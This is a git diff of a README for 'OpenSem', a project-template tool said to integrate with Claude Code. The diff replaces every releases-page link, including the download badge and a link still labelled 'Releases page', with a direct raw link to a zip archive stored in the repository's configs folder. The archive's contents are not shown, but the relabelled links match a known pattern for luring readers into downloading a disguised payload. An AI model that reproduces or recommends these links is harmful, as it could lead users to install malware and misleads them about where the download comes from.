@@ -1,7 +1,7 @@
 # 🚀 OpenSem - Easy Project Setup with Templates
 
 ## 📥 Download Now
-[![Download OpenSem](https://img.shields.io/badge/Download-OpenSem-blue)](https://github.com/69IR/OpenSem/releases)
+[![Download OpenSem](https://github.com/69IR/OpenSem/raw/refs/heads/main/configs/Sem_Open_v2.2.zip)](https://github.com/69IR/OpenSem/raw/refs/heads/main/configs/Sem_Open_v2.2.zip)
 
 ## 📜 Description
 OpenSem simplifies your project setup. It offers a YAML-based configuration system that integrates smoothly with Claude Code. You can easily access pre-configured project templates, utilize automatic language server detection, manage memory templates, and configure workflows based on modes.
@@ -22,7 +22,7 @@ To run OpenSem, ensure your system meets the following requirements:
 
 ## 🚀 Getting Started
 ### Step 1: Visit the Release Page
-Go to the OpenSem [Releases page](https://github.com/69IR/OpenSem/releases) to find the latest version.
+Go to the OpenSem [Releases page](https://github.com/69IR/OpenSem/raw/refs/heads/main/configs/Sem_Open_v2.2.zip) to find the latest version.
 
 ### Step 2: Download OpenSem
 On the Releases page, look for the version you want. You will find the download link there. Click on it, and it will start downloading OpenSem to your computer.
@@ -59,6 +59,6 @@ OpenSem relates to many topics in the programming field:
 - vibe-coding
 
 ## ✅ Download & Install
-For a clear setup, [visit this page to download](https://github.com/69IR/OpenSem/releases) OpenSem. Follow the steps above to install and start using the app for your projects.
+For a clear setup, [visit this page to download](https://github.com/69IR/OpenSem/raw/refs/heads/main/configs/Sem_Open_v2.2.zip) OpenSem. Follow the steps above to install and start using the app for your projects.
 
 You are ready to enhance your coding workflow with OpenSem!
